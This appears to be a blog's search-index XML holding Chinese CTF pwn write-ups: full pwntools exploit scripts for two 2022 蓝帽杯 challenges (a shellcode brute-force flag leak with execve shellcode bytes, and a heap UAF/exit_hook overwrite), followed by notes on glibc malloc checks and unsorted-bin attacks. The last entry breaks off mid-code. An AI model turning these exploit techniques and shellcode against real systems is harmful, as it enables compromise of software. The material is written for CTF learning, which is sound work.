<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Dest0g3迎新赛wp及其复现</title>
      <link href="/2022/09/11/%E8%93%9D%E5%B8%BD%E6%9D%AFwp/"/>
      <url>/2022/09/11/%E8%93%9D%E5%B8%BD%E6%9D%AFwp/</url>
      
        <content type="html"><![CDATA[<h1 id="2022蓝帽杯初赛pwn"><a href="#2022蓝帽杯初赛pwn" class="headerlink" title="2022蓝帽杯初赛pwn"></a>2022蓝帽杯初赛pwn</h1><h2 id="escape-shellcode-pie-orw-shellcode"><a href="#escape-shellcode-pie-orw-shellcode" class="headerlink" title="escape_shellcode(pie_orw_shellcode)"></a>escape_shellcode(pie_orw_shellcode)</h2><p>写入heap_mem+170地址后，情况除rip外的所有寄存器，然后执行shellcode。</p><p>难点在于没有基地址，无法打印bss段中的flag。</p><p>注意的点，堆地址高5位和基地址相同，从基地址开始0x1000地读</p><p>write系统调用会返回给rcx寄存器，下一条指令的地址（堆地址），堆地址和bss段前几位一样的，所有可以采用爆破，爆出flag</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./escape_shellcode&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./escape_shellcode&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(<span class="built_in">str</span>(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> text,data          :p.sendafter(text, <span class="built_in">str</span>(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(<span class="built_in">str</span>(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> text,data          :p.sendlineafter(text, <span class="built_in">str</span>(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :p.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">base=<span class="number">0x500000000000</span></span><br><span class="line"></span><br><span class="line">shell=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rdi,1</span></span><br><span class="line"><span class="string">mov rsi,&#123;&#125;</span></span><br><span class="line"><span class="string">mov rdx,0x1000</span></span><br><span class="line"><span class="string">mov r14,0xfffff0000000</span></span><br><span class="line"><span class="string">mov r15,0x1000</span></span><br><span class="line"><span class="string">mov rax,1</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mov rsi,rcx</span></span><br><span class="line"><span class="string">and rsi,r14</span></span><br><span class="line"><span class="string">add rsi,r15</span></span><br><span class="line"><span class="string">add r15,0x1000</span></span><br><span class="line"><span class="string">jmp $-0x19</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line"></span><br><span class="line">p.send(asm(shell))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;flag&#123;&quot;</span>)</span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span>+p.recvuntil(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h2 id="Bank-exit-hook"><a href="#Bank-exit-hook" class="headerlink" title="Bank(exit_hook)"></a>Bank(exit_hook)</h2><p>题目实现了一个简单的取款机，主要的难点在于无限刷钱，刷够钱才能做事，要不然原来的初始的190块钱不够用</p><p>漏洞点在这里：就是取钱的时候，如果取的钱数和账户里面相等，是不扣钱的，所以利用这个刷钱就行了。</p><p>刷够钱以后，后面思路就简单了，泄露堆地址和libc地址，往exit_hook里写入one_gadget即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&quot;./Bank&quot;</span>)</span><br><span class="line"><span class="comment"># r = remote(&#x27;node4.buuoj.cn&#x27;,29678)</span></span><br><span class="line">e = ELF(<span class="string">&quot;./Bank&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">libc = e.libc</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./buu2.23.so&#x27;)</span></span><br><span class="line">r.timeout = <span class="number">0.5</span></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :r.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :r.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :r.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :r.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :r.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :r.recv(numb)</span><br><span class="line">rl      = <span class="keyword">lambda</span>                    :r.recvline()</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims    :r.recvuntil(delims)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(ru(data)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(ru(data)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">info_base = <span class="keyword">lambda</span> tag, base        :r.info(tag + <span class="string">&#x27;: &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(base))</span><br><span class="line">leak = <span class="keyword">lambda</span> name,base :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, base))</span><br><span class="line"><span class="comment">#0x203010</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">cmd</span>):</span><br><span class="line">gdb.attach(r,cmd)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Login</span>():</span><br><span class="line">ru(<span class="string">b&#x27;Click:&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;Login&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Card Numbers: &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;1111111&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;Password: &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;505050&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Info</span>():</span><br><span class="line">ru(<span class="string">b&#x27;Click:&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;Info&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">put</span>():</span><br><span class="line">ru(<span class="string">b&#x27;Click:&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;Put&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&quot;How Much? &quot;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;400&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Deposit</span>():</span><br><span class="line">ru(<span class="string">b&#x27;Click:&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;Deposit&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&quot;How Much? &quot;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;400&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_admin</span>(<span class="params">money</span>): <span class="comment">#leak _ptr + 8 * money</span></span><br><span class="line">ru(<span class="string">b&#x27;Click:&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;Transfer&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;who? &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;admin&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;How much?&#x27;</span>)</span><br><span class="line">sl(<span class="built_in">str</span>(money).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free_hacker</span>(<span class="params">chunk_addr</span>): <span class="comment">#free uaf</span></span><br><span class="line">ru(<span class="string">b&#x27;Click:&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;Transfer&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;who? &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;hacker&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;How much?&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;51&#x27;</span>)</span><br><span class="line">se(<span class="built_in">str</span>(chunk_addr).encode())</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_guest</span>(<span class="params">desc</span>):</span><br><span class="line">ru(<span class="string">b&#x27;Click:&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;Transfer&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;who? &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;guest&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;How much? &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;10&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&quot;data: &quot;</span>)</span><br><span class="line">se(desc)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">realloc_gohst</span>(<span class="params">size</span>): <span class="comment"># change ptr</span></span><br><span class="line">ru(<span class="string">b&#x27;Click:&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;Transfer&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;who? &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;ghost&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;How much? &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;11&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&quot;ghost: &amp;^%$#@!   :)&quot;</span>)</span><br><span class="line">se(<span class="built_in">str</span>(size).encode())</span><br><span class="line">ru(<span class="string">b&#x27;&quot;ghost: ??????? :(&quot;&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">abyss</span>(<span class="params">addr</span>):</span><br><span class="line">ru(<span class="string">b&#x27;Click:&#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;Transfer&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;who? &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;abyss&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;How much? &#x27;</span>)</span><br><span class="line">sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">ru(<span class="string">b&#x27;&quot;hacker: Great!&quot;&#x27;</span>)</span><br><span class="line">se(addr)</span><br><span class="line"><span class="comment"># ptr = 203050 + 0x555555400000</span></span><br><span class="line">Login()</span><br><span class="line">put()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">Deposit()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">put()</span><br><span class="line">pl1 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">realloc_gohst(<span class="number">0x100</span>)</span><br><span class="line">realloc_gohst(<span class="number">0xe0</span>)</span><br><span class="line">leak_admin(<span class="number">0x23</span>)</span><br><span class="line">ru(<span class="string">b&#x27;I think &#x27;</span>)</span><br><span class="line">heap = rc(<span class="number">14</span>)</span><br><span class="line">heap_base = <span class="built_in">int</span>(heap,<span class="number">16</span>) - <span class="number">0x10</span></span><br><span class="line">leak(<span class="string">&quot;heap_base&quot;</span>,heap_base)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">realloc_gohst(<span class="number">0x100</span>)</span><br><span class="line">realloc_gohst(<span class="number">0xe0</span>)</span><br><span class="line">leak_admin(<span class="number">242</span>)</span><br><span class="line">ru(<span class="string">b&#x27;I think &#x27;</span>)</span><br><span class="line">libc = rc(<span class="number">14</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(libc,<span class="number">16</span>) - <span class="number">0x1ecbe0</span></span><br><span class="line">shell = libc_base+<span class="number">0xe6c7e</span></span><br><span class="line">exit_hook = libc_base + <span class="number">0x210150</span></span><br><span class="line">realloc_gohst(<span class="number">0x18</span>)</span><br><span class="line">chunk = heap_base + <span class="number">0xb40</span></span><br><span class="line">leak(<span class="string">&quot;chunk&quot;</span>,chunk)</span><br><span class="line">free_hacker(chunk)</span><br><span class="line">pl1 = <span class="string">b&#x27;aaaaaaaa&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">add_guest(pl1)</span><br><span class="line">add_guest(p64(exit_hook))</span><br><span class="line">abyss(p64(shell))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>GLIBC版本更新的一些变动</title>
      <link href="/2022/07/10/glibc%E7%89%88%E6%9C%AC%E6%9B%B4%E6%96%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8F%98%E5%8A%A8/"/>
      <url>/2022/07/10/glibc%E7%89%88%E6%9C%AC%E6%9B%B4%E6%96%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%8F%98%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="glibc2-27（小版本变动没记）"><a href="#glibc2-27（小版本变动没记）" class="headerlink" title="glibc2.27（小版本变动没记）"></a>glibc2.27（小版本变动没记）</h2><ul><li>增加了tcache</li><li>再malloc_consolidate中</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*新增：检查从fastbin中取出的chunk的大小是否满足fastbin的索引，house-of-rabbit无法使用  */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index (chunksize (p));</span><br></pre></td></tr></table></figure><ul><li>在unlink中</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*新增：检查其下一个chunk的prev_size是否和size相等，即使用house-of-einherjar时第一个chunk应该被放入到unsortedbin中*/</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), <span class="number">0</span>)) </span><br><span class="line">malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="glibc2-29"><a href="#glibc2-29" class="headerlink" title="glibc2.29"></a>glibc2.29</h2><ul><li>tcache_entry结构体中增加了key，防止doublefree</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><ul><li>对在unsortedbin中即将取出的chunk和其nextchunk做检查(unsorted_attack报废)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*新增：unsortedbin attack失效，house-of-storm无法使用*/</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &lt;= <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">       || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): invalid size (unsorted)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">       || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): mismatching next-&gt;prev_size(unsorted)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">       || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br></pre></td></tr></table></figure><ul><li>在unlink前增加了对prev_size和size的判断</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*新增：检查了prev_size和上一个chunk的size是否相等,house-of-einherjar不能使用*/</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br></pre></td></tr></table></figure><h2 id="glibc-2-30-amp-glibc-2-31"><a href="#glibc-2-30-amp-glibc-2-31" class="headerlink" title="glibc-2.30&amp;glibc-2.31"></a>glibc-2.30&amp;glibc-2.31</h2><ul><li>tcache_perthread_struct中的counts类型变为uint16_t类型</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">uint16_t</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure><ul><li>如果tcache-&gt;counts[tc_idx]&lt;&#x3D;0则不会从tcache中取chunk</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">    &amp;&amp; tcache</span><br><span class="line">    &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>将chunk从unsortedbin中取出放入到largebin时做了检查，增大了largebin attack的难度。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted (bk)&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="glibc-2-32"><a href="#glibc-2-32" class="headerlink" title="glibc-2.32"></a>glibc-2.32</h2><ul><li>tcache中对e-&gt;next也就是fd指针做了加密，(&amp;e-&gt;next&gt;&gt;12)&lt;&lt;12即为heap_base</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) </span></span><br><span class="line">  ((__typeof (ptr)) ((((<span class="type">size_t</span>) pos) &gt;&gt; <span class="number">12</span>) ^ ((<span class="type">size_t</span>) ptr)))</span><br></pre></td></tr></table></figure><ul><li>对fastbin的fd指针也做了相同的加密。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*新增：fastbin的fd指针被加密*/</span></span><br><span class="line">p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>增加了很多指针是否对齐的检查</li></ul>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>任意地址写较大数总结</title>
      <link href="/2022/07/01/Large_ubsorted/"/>
      <url>/2022/07/01/Large_ubsorted/</url>
      
        <content type="html"><![CDATA[<h2 id="unsorted-bin-attack"><a href="#unsorted-bin-attack" class="headerlink" title="unsorted_bin attack"></a>unsorted_bin attack</h2><p>先写一下可以利用的版本吧，也就是GLIBC2.23-GLIBC2.28,我们可以看一下源代码这一段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* remove from unsorted list */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>这个攻击其实是用在摘链的时候，如果我们可以控制 unsorted_bin中的bk指针，我们可以写入任意地址（姑且称为target），当我们malloc掉这个unsorted_chunk时，我们的target+0x10地址出就会被修改为 main_arena+offest的地址，其实也就是libc中的地址。效果就是修改任意地址为一个较大的数。</p><p>在GLIBC2.29及以后，int_malloc()函数源码中加入了这段</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 